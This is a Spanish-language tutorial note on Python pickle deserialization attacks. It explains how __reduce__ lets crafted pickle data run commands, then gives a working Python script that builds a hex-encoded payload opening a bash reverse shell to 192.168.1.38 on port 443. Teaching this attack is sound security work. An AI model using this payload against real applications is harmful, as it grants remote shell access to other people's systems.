-----
- Tags: #ataques #basico #teoria #practica 
----

# ¿ Que es **Pickling** ? 

### **Pickling** es el proceso mediante el cual una jerarquía de objetos de Python se convierte en una secuencia de bytes.

----

# ¿ Que es un **ataque de deserialización Pickle** ? 

### Un **ataque de deserialización Pickle (DES-Pickle)** es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan la biblioteca Pickle para serializar y deserializar objetos. 

### La vulnerabilidad se produce cuando un atacante es capaz de controlar la entrada Pickle que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada Pickle, puede permitir que un atacante inyecte código maliciosos en el objeto deserializado. 

### Una vez que el objeto ha sido deserializado, el código malicioso puede ser ejecutado en el contexto de la aplicación, lo que puede permitir al atacante tomar el control del sistema, acceder a datos sensibles, o incluso ejecutar código remoto.

### Los atacantes  puede aprovecharse de las vulnerabilidades de DES-Pickle para realizar ataques de denegación de servicio (DoS), inyectar código malicioso, o incluso tomar el control completo del sistema. 

--- 

# Explotación 

### Supongamos que tenemos una app la cual recibe una cadena hexadecimal en un objeto serializado con Pickle, la convierte a texto legible y la guarda en un archivo sin ningún tipo de validación. 

### En el proceso de deserialización, en Pickle, hay una función llamada **__reduce__** la cual podemos controlar para que a la hora de deserializar una data, podemos ingresar a nivel de sistema como queremos que se deserialize o como queremos que se ejecute. Por lo que a la hora de realizar un ataque de deserialización en Pickle mayormente crearíamos un archivo tal que así: 

```python
import pickle, os, binascii 
# binascii para poder convertir la cadena a hexadecimal.

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/192.168.1.38/443 0>&1"',))

if __name__ == "__main__": 
    print(binascii.hexlify(pickle.dumps(Exploit())))
```

### Creamos una clase con la función **__reduce__** la cual retorna lo que nos interesa que devuelva, en este caso la ejecución de un comando a nivel de sistema. Para posteriormente pesarle a la función **pickle.dumps()** para mostrar por consola la data serializada (El comando a ejecutar a nivel de sistema). 

